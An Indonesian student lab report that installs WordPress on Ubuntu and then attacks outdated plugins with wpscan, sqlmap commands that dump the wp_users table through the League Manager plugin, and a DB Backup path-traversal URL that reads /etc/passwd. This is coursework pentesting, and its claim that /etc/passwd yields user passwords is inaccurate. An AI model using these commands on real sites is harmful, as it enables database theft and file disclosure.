# Laporan Tugas 2 PKSJ
## Pendahuluan
Laporan ini dibuat sebagai tugas 2 dari mata kuliah Peracangan Keamanan dan Sekuritas Jaringan. Pada laporan ini terdapat penjelasan-penjelasan dan hasil percobaan SQL Injection yang kami lakukan. 
Laporan ini disusun oleh :
Setiyo Adiwicaksono		:5113100020
Fajar Ade Putra			:5113100092
Anwar Rosyidi			:5113100180

## Dasar Teori
### OS yan digunakan
1.  Ubuntu Server 14.04 : Ubuntu server adalah ubuntu yang didesain untuk di install di server. Perbedaan mendasar, di Ubuntu Server tidak tersedia GUI. Jika anda menggunakan ubuntu server artinya anda harus bekerja dengan perintah perintah di layar hitam ayng sering disebut konsole. Jika anda datang dari windows, maka tampilan ubuntu server seperti DOS.
2.   Kali Linux adalah generasi baru dari BackTrack Linux, pemimpin industri Penetration Testing dan audit keamanan distribusi Linux. Kali Linux merupakan pembangunan kembali dari BackTrack Linux dari dasar dan mengikuti sepenuhnya standar pengembangan Debian.

### Tools yang digunakan
1. SSH Server :SSH adalah akronim dari Secure Shell yang merupakan sebuah protokol jaringan yang memanfaatkan kriptografi untuk melakukan komunikasi data pada perangkat jaringan agar lebih aman. Dalam konsepnya penggunaan SSH ini harus di dukung oleh server maupun perangkat atau komputer klien yang melakukan pertukaran data. Keduanya harus memiliki SSH server dari sisi komputer server dan SSH klien untuk komputer penerima (klien).
2. Tolong ditambahkan

## Uji coba
## Instalasi Wordpress
1. Pertama, lakukan koneksi ssh dengan server
```
ssh server@192.168.56
```
2. Lakukan instalasi apache server
```
sudo apt-get install apache2
```
![GitHub Logo](PKSJ2/apache.JPG)

3. Install database mysql
```
sudo apt-get install mysql-server php5-mysql
```
```
sudo mysql_install_db
```
```
sudo mysql_secure_installation
```
4. Install PHP
```
sudo apt-get install php5 libapache2-mod-php5 php5-mcrypt
```
untuk mengetahui apabila php sudah terinstall silahkan buat file php di var/www/html/ 
![GitHub Logo](PKSJ2/php.JPG)

5. Buat database untuk wordpress
- log in ke dalam mysql root
```
mysql -u root -p
```
-  Buat database wordpress
```
CREATE DATABASE wordpress;
```
- buat user untuk akses database
```
CREATE USER wordpressuser@localhost IDENTIFIED BY 'password';
```
- Berikan privileges akses kepada akun db yang kita buat
```
GRANT ALL PRIVILEGES ON wordpress.* TO wordpressuser@localhost;
```
```
FLUSH PRIVILEGES;
exit
```
## Download wordpress
1. Lakukan download wordpress dengan memasukan syntax
```
cd ~
wget http://wordpress.org/latest.tar.gz
```
![GitHub Logo](PKSJ2/dwwp.JPG)
2. Kemudian extract hasil download
```
tar xzvf latest.tar.gz
```
3. Install package yang diperlukan 
```
sudo apt-get update
sudo apt-get install php5-gd libssh2-php
```
## Konfigurasi wordpress
1. Buka directory wordpress
```
cd ~/wordpress
```
2. Membuat backup file config wordpress
```
cp wp-config-sample.php wp-config.php
```
3. buka wpconfig untuk melakukan konfigurasi database
```
nano wp-config.php
```
![GitHub Logo](PKSJ2/setingwp.JPG)

4. copy file yang ada pada directory wordpress ke document root
```
sudo rsync -avP ~/wordpress/ /var/www/html/
```
5. buka document root dan rubah ownership file wordpress
```
cd /var/www/html
sudo chown -R demo:www-data *
```
6. kemudian kita buat folder uploads pada document root dan rubah ownershipnya
```
mkdir /var/www/html/wp-content/uploads
sudo chown -R :www-data /var/www/html/wp-content/uploads
```
7. Selanjutnya lakukan konfigurasi dengan membuka halaman wordpress yang telah kita install
![GitHub Logo](PKSJ2/setwp.JPG)
![GitHub Logo](PKSJ2/setsuk.JPG)
8. Proses instalasi selesai dan kita bisa membuka halaman wp-admin
![GitHub Logo](PKSJ2/wpadmin.JPG)
### Hasil halaman wordpress yang berhasil diinstall
![GitHub Logo](PKSJ2/sip.JPG)

## Instalasi Plugin Wordpress
1. Silahkan buka bagian **wp-admin** dan silahkan buka bagian menu plugin. Lalu silahkan tekan tombol bagian **Add New**
![GitHub Logo](PKSJ2/plugin.JPG)

2. Silahkan tekan tombol upload plugin untuk mengupload plugin yang kita download secara external, ataupun langusng di search pada kolom serch plugin. Setelah muncul tombolo browse, silahkan pilih plugin mana yang ingin di install, dan silahkan langsung di install
![GitHub Logo](PKSJ2/plugin1.JPG)

## Exploit Wordpress Menggunakan Tools SQLMAP dan WPSCAN
### Exploit Wordpress menggunakan WPscan
Fungsi penggunaan wpscan dalam exploit kali ini adalah untuk mendeteksi celah keamanan dari sebuah web berbasis wordpress. Penggunaan wpscan adalah jalankan kode dibawah dengan terminal.
```
wpscan --url http://[url yang dituju] -enumerate
```
Maka akan muncul tanda yang menunjukan celah keamanan dari plugin yang sudah di install pada wordpress
![GitHub Logo](PKSJ2/wpscan.JPG)

###Exploit dan Inject Sql menggunakan Sqlmap pada plugin league manager
1. Silahkan jalankan perintah dibawah ini untuk mengetahui bagaimana struktur tabel dari wordpress yang ada
```
sqlmap --url "http://[alamat yang dituju]/?match=1" --tables
```
![GitHub Logo](PKSJ2/sqlmaplm1.JPG)

2. Ketika kita ingin mengetahui bagaimana isi dari tabel yang kita inginkan, silahkan jalankan script dibawah ini
```
sqlmap --url "http://[alamat yang dituju]/?match=1" --dump -D [database yang diinginkan] -T [tabel yang diinginkan]
```
![GitHub Logo](PKSJ2/sqlmaplm2.JPG)

3. Pada case ini, kita akan mencoba membuka dan melihat tabel wp_users, makan masukkan perintah
```
sqlmap --url "http://10.151.36.128/?match=1" --dump -D wordpress -T wp_users
```
![GitHub Logo](PKSJ2/sqlmaplm3.JPG)
Bisa dilihat bahwa kita mendapatkan isi dari tabel wp_user, akan tetapi pada bagian password, hanya terlihat hasil enkripsinya karena di hash dictionary dari aplikasi sqlmap, tidak ada yang cocok dengan password user tersebut

###Mencari Celah Keamanan pada plugin DB Backup
1. Silahkan install plugin db Backup, dan silahkan masukkan url berikut pada browser anda untuk membuktikan celah keamanan db backup
```
[localhost]/wp-content/plugins/db-backup/download.php?file=/etc/passwd
```
2. Maka bisa dilihat bahwa kita bisa mendownload isi dari /etc/passwd dan mendapatkan password dari user yang ada pada server tersebut
![GitHub Logo](PKSJ2/jebol1.JPG)
Mendownload file passwd.passwd
![GitHub Logo](PKSJ2/jebol2.JPG)
Isi dari file passwd.passwd

##Kesimpulan

Dari hasil uji coba penetrasi SQL Injection didapatkan bahwa masih terdapat celah-celah yang dapat ditembus, kita dapat melakukan SQL Injection melalui celah yang terdapat pada plugin yang belum update walaupun wordpress sudah paling update terbaru.

##Saran

Periksalah update-update pada wordpress dan pluginya secara berkala, jika terdapat update pada wordpress dan plugin-plugin yang terinstall, segeralah untuk melakukan update karena celah-celah SQL Injection bisa terdapat pada plugin yang belum update tersebut.
